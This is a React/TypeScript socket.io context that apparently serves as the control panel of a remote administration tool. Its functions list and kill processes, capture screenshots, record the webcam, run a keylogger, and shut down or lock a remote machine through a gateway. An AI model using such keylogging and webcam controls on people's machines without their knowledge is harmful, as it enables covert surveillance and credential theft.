import React, {
  createContext,
  useContext,
  useState,
  useRef,
  useCallback,
  ReactNode,
} from "react";
import { io as IO, Socket } from "socket.io-client";
import { addToast } from "@heroui/toast";

export interface KeyLogger {
  TimeStamp: number;
  Key: string[];
}

export interface Process {
  PID: number;
  Name: string;
  Memory: string;
}

export interface Application {
  PID: number;
  Name: string;
  Title: string;
  Memory: string;
}

export interface Screenshot {
  TimeStamp: number;
  Size: number;
  URL: string;
}

export interface Webcam {
  TimeStamp: number;
  Size: number;
  URL: string;
}

export interface StartableApplication {
  Name: string;
}

interface SocketContextType {
  UpTime: number;
  Ping: number;
  IsGatewayConnected: boolean;
  IsServerConnected: boolean;
  GatewayConnectError: string | null;
  ServerConnectError: string | null;
  ConnectToGateway: (IP: string, Port: string) => void;
  ConnectToServer: (IP: string, Port: string) => void;
  DisconnectFromServer: () => void;
  StartableApplicationList: StartableApplication[];
  ProcessList: Process[];
  ApplicationList: Application[];
  KillProcess: (PID: number) => void;
  StartProcess: (Name: string) => void;
  SubscribeToProcesses: () => void;
  UnsubscribeFromProcesses: () => void;
  SubscribeToApplications: () => void;
  UnsubscribeFromApplications: () => void;
  CaptureScreenshot: () => void;
  RecordWebcam: (Duration: number) => void;
  StartKeyLogger: () => void;
  StopKeyLogger: () => void;
  PrintKeyLogger: () => void;
  IsWebcamOn: boolean;
  IsScreenshotOn: boolean;
  IsKeyLoggerOn: boolean;
  KeyLoggers: KeyLogger[];
  Screenshots: Screenshot[];
  WebcamRecordings: Webcam[];
  ShutDown: () => void;
  Reboot: () => void;
  Hibernate: () => void;
  Sleep: () => void;
  Lock: () => void;
}

const SocketContext = createContext<SocketContextType | undefined>(undefined);

export const useSocket = () => {
  const context = useContext(SocketContext);

  if (!context) {
    throw new Error("useSocket must be used within a SocketProvider");
  }

  return context;
};

export const SocketProvider: React.FC<{ children: ReactNode }> = ({
  children,
}) => {
  const [IsGatewayConnected, SetIsGatewayConnected] = useState<boolean>(false);
  const [IsServerConnected, SetIsServerConnected] = useState<boolean>(false);
  const [GatewayConnectError, SetGatewayConnectError] = useState<string | null>(null);
  const [ServerConnectError, SetServerConnectError] = useState<string | null>(null);
  const [ProcessList, SetProcessList] = useState<Process[]>([]);
  const [ApplicationList, SetApplicationList] = useState<Application[]>([]);
  const [StartableApplicationList, SetStartableApplicationList] = useState<StartableApplication[]>([]);
  const [Screenshots, SetScreenshots] = useState<Screenshot[]>([]);
  const [WebcamRecordings, SetWebcamRecordings] = useState<Webcam[]>([]);
  const [KeyLoggers, SetKeyLoggers] = useState<KeyLogger[]>([]);
  const [IsKeyLoggerOn, SetIsKeyLoggerOn] = useState<boolean>(false);
  const [IsWebcamOn, SetIsWebcamOn] = useState<boolean>(false);
  const [IsScreenshotOn, SetIsScreenshotOn] = useState<boolean>(false);
  const [UpTime, SetUpTime] = useState<number>(0);
  const [Ping, SetPing] = useState<number>(0);
  const IntervalRef = useRef<NodeJS.Timeout | null>(null);
  const SocketRef = useRef<Socket | null>(null);

  const SetupSocketListeners = useCallback((NewSocket: Socket) => {
    NewSocket.on("connect", () => {
      console.log("Connected to Gateway");
      NewSocket.emit("Client:Register", { IP: "127.0.0.1", Port: "3000" });
      SetIsGatewayConnected(true);
      addToast({
        title: "Connected",
        description: "Successfully connected to Gateway",
      });
    });

    NewSocket.on("disconnect", () => {
      console.log("Disconnected from Gateway");
      SetIsGatewayConnected(false);
      SetIsServerConnected(false);
      SetServerConnectError(null);
      SetGatewayConnectError(null);
      SetProcessList([]);
      SetApplicationList([]);
      SetScreenshots([]);
      SetWebcamRecordings([]);
      SetKeyLoggers([]);
      SetIsKeyLoggerOn(false);
      SetIsWebcamOn(false);
      SetIsScreenshotOn(false);
      SocketRef.current?.disconnect();
      if (IntervalRef.current) clearInterval(IntervalRef.current);
      IntervalRef.current = null;
      addToast({
        title: "Disconnected",
        description: "Disconnected from Gateway",
      });
    });

    NewSocket.on("connect_error", (Error) => {
      SetIsGatewayConnected(false);
      SetGatewayConnectError(Error.message);
      addToast({
        title: "Connection Error",
        description: Error.message,
      });
    });

    NewSocket.on("Client:Register:Success", () => {
      console.log("Client Registered with Gateway");
    });

    NewSocket.on("Client:Connect:Success", () => {
      console.log("Connected to Server via Gateway");
      SetIsServerConnected(true);
      if (IntervalRef.current) clearInterval(IntervalRef.current);
      IntervalRef.current = setInterval(() => {
        SetUpTime((prev) => prev + 1);
        SocketRef.current?.emit("Ping", Date.now());
      }, 1000);
      addToast({
        title: "Connected",
        description: "Successfully connected to Server",
        color: "success",
      });
    });

    NewSocket.on("Pong", (Data: number) => {
      const Latency = Date.now() - Data;
      SetPing(Latency);
    });

    NewSocket.on("Client:Connect:Error:NotRegistered", () => {
      SetServerConnectError("Client:Connect:Error:NotRegistered");
      addToast({
        title: "Connection Error",
        description: "Client not registered",
        color: "danger",
      });
    });

    NewSocket.on("Client:Connect:Error:ServerNotFound", () => {
      SetServerConnectError("Client:Connect:Error:ServerNotFound");
      addToast({
        title: "Connection Error",
        description: "Server not found",
        color: "danger",
      });
    });

    NewSocket.on("Client:Connect:Error:AlreadyConnected", () => {
      SetServerConnectError("Client:Connect:Error:AlreadyConnected");
      addToast({
        title: "Connection Error",
        description: "Server already connected",
        color: "danger",
      });
    });

    NewSocket.on("Client:Connect:Error:ServerDisconnected", () => {
      SetServerConnectError("Client:Connect:Error:ServerDisconnected");
      SetIsServerConnected(false);
      SetIsGatewayConnected(false);
      SetServerConnectError(null);
      SetGatewayConnectError(null);
      if (IntervalRef.current) clearInterval(IntervalRef.current);
      IntervalRef.current = null;
      SetProcessList([]);
      SetApplicationList([]);
      SetScreenshots([]);
      SetWebcamRecordings([]);
      SetKeyLoggers([]);
      SetIsKeyLoggerOn(false);
      SetIsWebcamOn(false);
      SetIsScreenshotOn(false);
      addToast({
        title: "Connection Error",
        description: "Server disconnected",
        color: "danger",
      });
    });

    NewSocket.on("Server:Disconnect", () => {
      SetIsServerConnected(false);
      SetIsGatewayConnected(false);
      SetServerConnectError(null);
      SetGatewayConnectError(null);
      if (IntervalRef.current) clearInterval(IntervalRef.current);
      IntervalRef.current = null;
      SetUpTime(0);
      SetPing(0);
      SetProcessList([]);
      SetApplicationList([]);
      SetScreenshots([]);
      SetWebcamRecordings([]);
      SetKeyLoggers([]);
      SetIsKeyLoggerOn(false);
      SetIsWebcamOn(false);
      SetIsScreenshotOn(false);
      addToast({
        title: "Disconnected",
        description: "Server Disconnected",
      });
    });

    NewSocket.on("Process:List", (Data: Process[]) => {
      SetProcessList(Data);
    });

    NewSocket.on(
      "Process:Killed",
      (Data: { Status: string; PID: number; ProcessName: string }) => {
        if (Data.Status === "Success") {
          addToast({
            title: "Process Killed",
            description: `Process ${Data.ProcessName} (${Data.PID}) killed`,
            color: "success",
          });
        } else if (Data.Status === "Failed") {
          addToast({
            title: "Process Killed",
            description: `Process ${Data.ProcessName} (${Data.PID}) killed`,
            color: "danger",
          });
        } else {
          addToast({
            title: "Invalid Response",
            description: `Invalid response received`,
            color: "danger",
          });
        }
      },
    );

    NewSocket.on(
      "Process:Started",
      (Data: { Status: string; Name: string }) => {
        console.log(Data);
        if (Data.Status === "Success") {
          addToast({
            title: "Process Started",
            description: `Process ${Data.Name} started`,
            color: "success",
          });
        } else if (Data.Status === "Failed") {
          addToast({
            title: "Process Started",
            description: `Process ${Data.Name} started`,
            color: "danger",
          });
        } else {
          addToast({
            title: "Invalid Response",
            description: `Invalid response received`,
            color: "danger",
          });
        }
      },
    );

    NewSocket.on("Application:List", (Data: Application[]) => {
      SetApplicationList(Data);
    });

    NewSocket.on("Application:Startable", (Data: StartableApplication[]) => {
      SetStartableApplicationList(Data);
    });

    NewSocket.on(
      "Screenshot:Final",
      (Data: { TimeStamp: number; Size: number; URL: string }) => {
        const NewScreenshot: Screenshot = {
          TimeStamp: Data.TimeStamp,
          Size: Data.Size,
          URL: `data:image/jpeg;base64,${Data.URL}`,
        };

        SetIsScreenshotOn(false);
        SetScreenshots((prev) => [NewScreenshot, ...prev]);
        addToast({
          title: "Screenshot Captured",
          description: "New screenshot available",
          color: "success",
        });
      },
    );

    NewSocket.on(
      "Webcam:Final",
      (Data: { TimeStamp: number; Size: number; URL: string }) => {
        const NewWebcam: Webcam = {
          TimeStamp: Data.TimeStamp,
          Size: Data.Size,
          URL: `data:video/mp4;base64,${Data.URL}`,
        };

        SetWebcamRecordings((prev) => [NewWebcam, ...prev]);
        SetIsWebcamOn(false);
        addToast({
          title: "Webcam Recorded",
          description: "New webcam recording available",
          color: "success",
        });
      },
    );

    NewSocket.on(
      "KeyLogger:Start",
      (Data: KeyLogger) => {
        SetKeyLoggers((prev) => [Data, ...prev]);
        SetIsKeyLoggerOn(true);
      },
    );

    NewSocket.on(
      "KeyLogger:Print",
      (Data: KeyLogger) => {
        SetKeyLoggers((prev) => {
          const Index = prev.findIndex(item => item.TimeStamp === Data.TimeStamp);

          if (Index === -1) return prev;

          const UpdatedKeyLoggers = [...prev];
          UpdatedKeyLoggers[Index] = {
            ...UpdatedKeyLoggers[Index],
            Key: [...UpdatedKeyLoggers[Index].Key, ...Data.Key],
          };

          return UpdatedKeyLoggers;
        });
      },
    );

    NewSocket.on(
      "KeyLogger:Stop",
      (Data: KeyLogger) => {
        SetKeyLoggers((prev) => {
          const Index = prev.findIndex(item => item.TimeStamp === Data.TimeStamp);

          if (Index === -1) return prev;

          const UpdatedKeyLoggers = [...prev];
          UpdatedKeyLoggers[Index] = {
            ...UpdatedKeyLoggers[Index],
            Key: [...UpdatedKeyLoggers[Index].Key, ...Data.Key],
          };

          return UpdatedKeyLoggers;
        });
        SetIsKeyLoggerOn(false);
      },
    );

  }, []);

  const ConnectToGateway = useCallback(
    (IP: string, Port: string) => {
      if (SocketRef.current) {
        SocketRef.current.disconnect();
      }

      const NewSocket = IO(`http://${IP}:${Port}`, {
        reconnection: false,
        timeout: 10000,
        transports: ["websocket"],
      });

      SocketRef.current = NewSocket;

      SetupSocketListeners(NewSocket);
    },
    [SetupSocketListeners],
  );

  const ConnectToServer = useCallback(
    (IP: string, Port: string) => {
      if (SocketRef.current && IsGatewayConnected) {
        SocketRef.current.emit("Client:Connect", { IP, Port });
      } else {
        addToast({
          title: "Error",
          description: "Not connected to Gateway",
        });
      }
    },
    [IsGatewayConnected],
  );

  const DisconnectFromServer = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Client:Disconnect");
      if (IntervalRef.current) clearInterval(IntervalRef.current);
      IntervalRef.current = null;
      SetUpTime(0);
      SetPing(0);
      SetIsServerConnected(false);
    }
  }, []);

  const KillProcess = useCallback((PID: number) => {
    if (SocketRef.current) {
      SocketRef.current.emit("Process:Kill", PID);
    }
  }, []);

  const StartProcess = useCallback((Name: string) => {
    if (SocketRef.current) {
      SocketRef.current.emit("Process:Start", Name);
    }
  }, []);

  const SubscribeToProcesses = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Process:Subscribe");
    }
  }, []);

  const UnsubscribeFromProcesses = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Process:Unsubscribe");
    }
  }, []);

  const SubscribeToApplications = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Application:Subscribe");
    }
  }, []);

  const UnsubscribeFromApplications = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Application:Unsubscribe");
    }
  }, []);

  const CaptureScreenshot = useCallback(() => {
    if (SocketRef.current) {
      SetIsScreenshotOn(true);
      SocketRef.current.emit("Screenshot:Take");
    }
  }, []);

  const RecordWebcam = useCallback((Duration: number) => {
    if (SocketRef.current) {
      SetIsWebcamOn(true);
      SocketRef.current.emit("Webcam:Record", Duration);
    }
  }, []);

  const StartKeyLogger = useCallback(() => {
    if (SocketRef.current) {
      SetIsKeyLoggerOn(true);
      SocketRef.current.emit("KeyLogger:Start");
    }
  }, []);

  const StopKeyLogger = useCallback(() => {
    if (SocketRef.current) {
      SetIsKeyLoggerOn(false);
      SocketRef.current.emit("KeyLogger:Stop");
    }
  }, []);

  const PrintKeyLogger = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("KeyLogger:Print");
    }
  }, []);

  const ShutDown = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Controller:ShutDown");
    }
  }, []);

  const Reboot = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Controller:Reboot");
    }
  }, []);

  const Hibernate = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Controller:Hibernate");
    }
  }, []);

  const Sleep = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Controller:Sleep");
    }
  }, []);

  const Lock = useCallback(() => {
    if (SocketRef.current) {
      SocketRef.current.emit("Controller:Lock");
    }
  }, []);

  const Value: SocketContextType = {
    UpTime,
    Ping,
    IsGatewayConnected,
    IsServerConnected,
    GatewayConnectError,
    ServerConnectError,
    ConnectToGateway,
    ConnectToServer,
    DisconnectFromServer,
    StartableApplicationList,
    ProcessList,
    ApplicationList,
    KillProcess,
    StartProcess,
    SubscribeToProcesses,
    UnsubscribeFromProcesses,
    SubscribeToApplications,
    UnsubscribeFromApplications,
    CaptureScreenshot,
    RecordWebcam,
    StartKeyLogger,
    StopKeyLogger,
    PrintKeyLogger,
    IsKeyLoggerOn,
    KeyLoggers,
    IsWebcamOn,
    IsScreenshotOn,
    Screenshots,
    WebcamRecordings,
    ShutDown,
    Reboot,
    Hibernate,
    Sleep,
    Lock,
  };

  return (
    <SocketContext.Provider value={Value}>{children}</SocketContext.Provider>
  );
};
